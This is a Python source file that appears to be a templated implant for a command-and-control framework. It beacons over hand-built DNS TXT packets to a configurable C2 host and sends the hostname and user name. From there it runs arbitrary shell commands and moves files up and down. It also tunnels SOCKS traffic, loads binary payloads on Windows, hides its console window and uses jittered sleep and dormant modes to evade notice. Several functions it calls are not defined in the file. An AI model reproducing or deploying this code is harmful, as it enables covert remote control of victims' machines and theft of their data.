#!/usr/bin/env python3
import json, platform, subprocess, os, getpass, socket, base64, sys, time, random, struct, hashlib

SERVER_HOST = "{{C2_HOST}}"
SERVER_PORT = {{C2_PORT}}
BEACON_INTERVAL = {{BEACON_INTERVAL}}
BEACON_JITTER = {{BEACON_JITTER}}
ENCRYPTION_KEY = b"{{ENCRYPTION_KEY}}"

def sleep_mask(seconds):
    import os
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    src = b'sockpuppets-sleep-mask'
    try:
        key = os.urandom(32)
        nonce = os.urandom(12)
        ct = AESGCM(key).encrypt(nonce, src, b'sockpuppets-sleep-mask-v1')
    except Exception:
        time.sleep(seconds)
        return
    time.sleep(seconds)
    try:
        AESGCM(key).decrypt(nonce, ct, b'sockpuppets-sleep-mask-v1')
    except Exception:
        pass

def stealth_sleep(seconds):
    secret = bytearray(ENCRYPTION_KEY)
    try:
        globals()['sleep_encrypt'](seconds, secret)
        return
    except Exception:
        sleep_mask(seconds)

def _key():
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives import hashes
    return HKDF(algorithm=hashes.SHA256(), length=32, salt=b'sockpuppets-salt-v1', info=b'sockpuppets-aes-256-gcm-v1').derive(ENCRYPTION_KEY)

def simple_encrypt(data: str) -> str:
    return wire_encrypt(data)

def simple_decrypt(data: str) -> str:
    return wire_decrypt(data)

def _name(labels):
    out = b''
    for label in labels:
        raw = label.encode()
        out += bytes([len(raw)]) + raw
    return out + b'\x00'

def _txt(blob):
    out = b''
    for i in range(0, len(blob), 255):
        chunk = blob[i:i+255]
        out += bytes([len(chunk)]) + chunk
    return out or b'\x00'

def _untxt(rdata):
    out = b''; i = 0
    while i < len(rdata):
        n = rdata[i]; i += 1
        out += rdata[i:i+n]; i += n
    return out

def _parse_name(data, offset):
    jumped = False
    start = offset
    while offset < len(data):
        length = data[offset]
        if length == 0:
            return start if jumped else offset + 1
        if length & 0xC0 == 0xC0:
            if not jumped:
                start = offset + 2
            offset = struct.unpack('!H', data[offset:offset+2])[0] & 0x3FFF
            jumped = True
            continue
        offset += 1 + length
    return offset

def exchange(payload: str) -> str:
    body = payload.encode()
    header = struct.pack('!HHHHHH', 1, 0x0100, 1, 0, 0, 1)
    question = _name(['c2']) + struct.pack('!HH', 16, 1)
    txt = _txt(body)
    additional = _name(['p']) + struct.pack('!HHIH', 16, 1, 0, len(txt)) + txt
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(8)
    sock.sendto(header + question + additional, (SERVER_HOST, SERVER_PORT))
    data, _ = sock.recvfrom(65535)
    sock.close()
    qd, an = struct.unpack('!HH', data[4:8])
    offset = 12
    for _ in range(qd):
        offset = _parse_name(data, offset) + 4
    for _ in range(an):
        offset = _parse_name(data, offset)
        rtype, _, _, rdlen = struct.unpack('!HHIH', data[offset:offset+10])
        rdata = data[offset+10:offset+10+rdlen]
        if rtype == 16:
            return _untxt(rdata).decode()
    return ''

def _handle_fs(command: str) -> str:
    import os, base64
    if command.startswith('__fs:ls:'):
        path = command[8:] or '.'
        try:
            entries = []
            for name in os.listdir(path):
                full = os.path.join(path, name)
                try:
                    st = os.stat(full)
                    prefix = 'd' if os.path.isdir(full) else '-'
                    entries.append(f"{prefix} {st.st_size:>12}  {name}")
                except OSError:
                    entries.append(f"? {'?':>12}  {name}")
            return '\n'.join(entries) if entries else 'Directory is empty'
        except Exception as e:
            return f"Error: {e}"
    if command.startswith('__fs:get:'):
        path = command[9:]
        if not os.path.isfile(path):
            return 'Error: not a file'
        if os.path.getsize(path) > 2 * 1024 * 1024:
            return 'Error: file too large (>2MB)'
        return 'FILE:' + base64.b64encode(open(path, 'rb').read()).decode()
    if command.startswith('__fs:put:'):
        rest = command[9:]
        path, _, b64 = rest.partition('\t')
        data = base64.b64decode(b64)
        parent = os.path.dirname(path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(path, 'wb') as f:
            f.write(data)
        return f'uploaded {len(data)} bytes to {path}'
    return 'Error: unknown fs command'


_socks_connections = {}

def _handle_socks_command(cmd_data, pending_results):
    cmd_type = cmd_data.get('type', '')
    conn_id = cmd_data.get('conn_id', '')
    if cmd_type == 'socks_init':
        return
    if cmd_type == 'socks_connect':
        host = cmd_data.get('host', '')
        port = cmd_data.get('port', 0)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            sock.setblocking(False)
            _socks_connections[conn_id] = sock
            pending_results.append({'type': 'socks_connect_ack', 'conn_id': conn_id, 'success': True})
        except Exception:
            pending_results.append({'type': 'socks_connect_ack', 'conn_id': conn_id, 'success': False})
        return
    if cmd_type == 'socks_send':
        sock = _socks_connections.get(conn_id)
        if sock:
            try:
                raw = base64.b64decode(cmd_data.get('data', ''))
                sock.setblocking(True)
                sock.settimeout(5)
                sock.sendall(raw)
            except Exception:
                pending_results.append({'type': 'socks_close', 'conn_id': conn_id})
                _socks_close(conn_id)
        return
    if cmd_type == 'socks_close':
        _socks_close(conn_id)
        return

def _socks_close(conn_id):
    sock = _socks_connections.pop(conn_id, None)
    if sock:
        try:
            sock.close()
        except Exception:
            pass

def _drain_socks_data(pending_results):
    for conn_id, sock in list(_socks_connections.items()):
        try:
            sock.setblocking(False)
            data = b''
            closed = False
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        closed = True
                        break
                    data += chunk
                except (BlockingIOError, OSError):
                    break
            if data:
                pending_results.append({
                    'type': 'socks_data', 'conn_id': conn_id,
                    'data': base64.b64encode(data).decode()
                })
            if closed:
                pending_results.append({'type': 'socks_close', 'conn_id': conn_id})
                _socks_close(conn_id)
        except Exception:
            pending_results.append({'type': 'socks_close', 'conn_id': conn_id})
            _socks_close(conn_id)


def _handle_bof(command: str) -> str:
    import base64, tempfile, os
    parts = command.split(':', 3)
    if len(parts) < 4:
        return 'Error: invalid BOF format (expected __bof:entry:args_b64:bof_data)'
    entry = parts[1]
    args_b64 = parts[2]
    bof_b64 = parts[3]
    try:
        bof_data = base64.b64decode(bof_b64)
        args_data = base64.b64decode(args_b64) if args_b64 else b''
    except Exception as e:
        return f'Error: base64 decode failed: {e}'
    if sys.platform != 'win32':
        return f'BOF received: {len(bof_data)} bytes, entry={entry}, args={len(args_data)} bytes (not Windows, skipping execution)'
    try:
        import ctypes
        tmp = tempfile.NamedTemporaryFile(suffix='.bin', delete=False)
        tmp.write(bof_data)
        tmp.close()
        try:
            lib = ctypes.CDLL(tmp.name)
            func = getattr(lib, entry, None)
            if func:
                func()
                result = f'BOF executed: entry={entry}, size={len(bof_data)} bytes'
            else:
                result = f'BOF loaded but entry "{entry}" not found (available: COFF object)'
        except OSError as e:
            result = f'BOF load error (expected for raw COFF): {e}'
        finally:
            os.unlink(tmp.name)
        return result
    except Exception as e:
        return f'BOF error: {e}'


def execute_command(command: str) -> str:
    if str(command).startswith('__hd:'):
        return hidden_desktop(command)
    if str(command).startswith('__px:'):
        return postex(command)
    if str(command).startswith('__fs:'):
        return _handle_fs(command)
    if str(command).startswith('__bof:'):
        return _handle_bof(command)
    try:
        if command.startswith('cd '):
            directory = command[3:].strip()
            os.chdir(directory)
            return f"Changed directory to {os.getcwd()}"
        if sys.platform == 'win32':
            CREATE_NO_WINDOW = 0x08000000
            parts = command.split()
            try:
                result = subprocess.run(parts, capture_output=True, text=True, timeout=30,
                                         cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
                output = result.stdout + result.stderr
                if output.strip():
                    return output
            except (FileNotFoundError, OSError):
                pass
            result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                     timeout=30, cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                     timeout=30, cwd=os.getcwd())
        return (result.stdout + result.stderr) or 'Command executed successfully (no output)'
    except Exception as e:
        return f'Error: {e}'

def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
    if jitter_percent <= 0 or jitter_percent > 100:
        return float(base_interval)
    jitter_amount = base_interval * (jitter_percent / 100.0)
    min_sleep = base_interval - jitter_amount
    max_sleep = base_interval + jitter_amount
    return random.uniform(max(0, min_sleep), max_sleep)

def connect_to_server():
    beacon_interval = BEACON_INTERVAL
    beacon_jitter = BEACON_JITTER
    agent_id = None
    pending = []
    while True:
        try:
            if not agent_id:
                meta = {'hostname': socket.gethostname(), 'username': getpass.getuser(),
                        'os': platform.system(), 'mode': 'beacon',
                        'beacon_interval': beacon_interval, 'beacon_jitter': beacon_jitter}
                reply = json.loads(simple_decrypt(exchange(simple_encrypt(json.dumps({'type': 'register', 'metadata': meta})))))
                agent_id = reply.get('agent_id') or None
                if not agent_id:
                    stealth_sleep(5)
                    continue

            _drain_socks_data(pending)

            msg = {'type': 'checkin', 'agent_id': agent_id,
                   'metadata': {'mode': 'beacon', 'beacon_interval': beacon_interval,
                                'beacon_jitter': beacon_jitter, 'hostname': socket.gethostname()},
                   'results': pending}
            pending = []
            data = json.loads(simple_decrypt(exchange(simple_encrypt(json.dumps(msg)))))
            if data.get('type') == 'registered':
                agent_id = data.get('agent_id')
                continue
            if data.get('type') == 'commands':
                for cmd_data in data.get('commands', []):
                    cmd_type = cmd_data.get('type', '')
                    if cmd_type in ('socks_init', 'socks_connect', 'socks_send', 'socks_close'):
                        _handle_socks_command(cmd_data, pending)
                        continue
                    command = cmd_data.get('command', '')
                    cmd_id = cmd_data.get('command_id', '')
                    if command.startswith('__set_interval:'):
                        try:
                            beacon_interval = int(command.split(':')[1])
                        except (ValueError, IndexError):
                            pass
                        continue
                    if command == '__kill':
                        sys.exit(0)
                    if command.startswith('__dormant:'):
                        try:
                            hours = float(command.split(':')[1])
                            secs = int(hours * 3600)
                            pending.append({
                                'type': 'response',
                                'output': f'Going dormant for {hours}h ({secs}s)',
                                'command': command,
                                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')
                            })
                            dormant_msg = {
                                'type': 'checkin', 'agent_id': agent_id,
                                'metadata': {'mode': 'beacon', 'beacon_interval': beacon_interval},
                                'results': pending
                            }
                            exchange(simple_encrypt(json.dumps(dormant_msg)))
                            pending = []
                            time.sleep(secs)
                        except (ValueError, IndexError):
                            pass
                        continue
                    if command:
                        output = execute_command(command)
                        result_entry = {
                            'type': 'response', 'output': output,
                            'command': command,
                            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')
                        }
                        if cmd_id:
                            result_entry['command_id'] = cmd_id
                        pending.append(result_entry)
            sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
            stealth_sleep(sleep_time)
        except Exception:
            stealth_sleep(5)

if __name__ == '__main__':
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass
    while True:
        try:
            connect_to_server()
            break
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(10)
